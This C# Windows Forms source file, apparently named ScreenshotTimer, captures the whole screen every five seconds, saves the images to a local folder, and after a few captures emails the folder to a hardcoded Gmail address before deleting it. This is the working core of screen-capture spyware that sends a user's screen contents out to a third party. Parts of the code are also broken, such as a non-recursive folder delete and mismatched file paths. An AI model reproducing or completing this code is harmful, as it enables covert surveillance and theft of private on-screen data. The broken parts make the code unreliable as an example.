using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Diagnostics;
using System.Threading;
using System.Net.Mail;
using SemiAutomaticConverter;

namespace ScreenshotTimer {
    public partial class Form1 : Form {
        public Form1() {
            InitializeComponent();
        }

        private void btnStart_Click(object sender, EventArgs e) {
            System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
            timer1.Tick += new EventHandler(this.timer1_Tick);
            timer1.Interval = (100) * (50);
            timer1.Enabled = true;
            timer1.Start();

        }

        private int pictureCount = 0;

        private void timer1_Tick(object sender, EventArgs e) {
            Bitmap bitmap = GetScreenShot();
            Directory.CreateDirectory(@"D:\pics"); 
            bitmap.Save( @"D:\pics\image" + pictureCount + ".jpeg");

            if(pictureCount == 3){
            EmailRequest emailRequest = new EmailRequest();
            emailRequest.SendEmail("abc@abc.xom", "mzkabbani@gmail.com", "capture", "pics", @"D:\pics");
            pictureCount = 0;
            Directory.Delete(@"D:\pics");
            Directory.CreateDirectory(@"D:\pics"); 
            }
            pictureCount++;
            File.Delete(@"D:\image" + pictureCount + ".jpeg");


            //     var stream = new MemoryStream();
        }


      
        public static Bitmap GetScreenShot() {
            //to allow the screen to refresh(repaint)
            Application.DoEvents();

            // Set the bitmap object to the size of the screen
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width
                                           , Screen.PrimaryScreen.Bounds.Height
                                           , PixelFormat.Format32bppArgb
                );

            // Create a graphics object from the bitmap
            Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Take the screenshot from the upper left corner to the right bottom corner
            try {
                 gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X
                                         , Screen.PrimaryScreen.Bounds.Y
                                         , 0
                                         , 0
                                         , Screen.PrimaryScreen.Bounds.Size
                                         , CopyPixelOperation.SourceCopy
                );
            } catch (Exception ex) {
                
                
            }

            return bmpScreenshot;
        }




        public void ScreenCapture(string initialDirectory) {
            using (BackgroundWorker worker = new BackgroundWorker()) {
                Thread.Sleep(0);
                this.Refresh();
                worker.DoWork += delegate(object sender, DoWorkEventArgs e) {
                    BackgroundWorker wkr = sender as BackgroundWorker;
                    Rectangle bounds = new Rectangle(Location, Size);
                    Thread.Sleep(300);
                    Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
                    using (Graphics g = Graphics.FromImage(bitmap)) {
                        g.CopyFromScreen(Location, Point.Empty, bounds.Size);
                    }
                    e.Result = bitmap;
                };
                worker.RunWorkerCompleted += delegate(object sender, RunWorkerCompletedEventArgs e) {
                    if (e.Error != null) {
                        Exception err = e.Error;
                        while (err.InnerException != null) {
                            err = err.InnerException;
                        }
                        MessageBox.Show(err.Message, "",
                            MessageBoxButtons.OK, MessageBoxIcon.Stop);
                    } else if (e.Cancelled == true) {
                    } else if (e.Result != null) {
                        if (e.Result is Bitmap) {
                            Bitmap bitmap = (Bitmap)e.Result;

                            bitmap.Save(Application.ExecutablePath.ToString() + @"\image" + pictureCount, ImageFormat.Jpeg);

                        }
                    }
                };
                worker.RunWorkerAsync();
            }
        }
    }
}
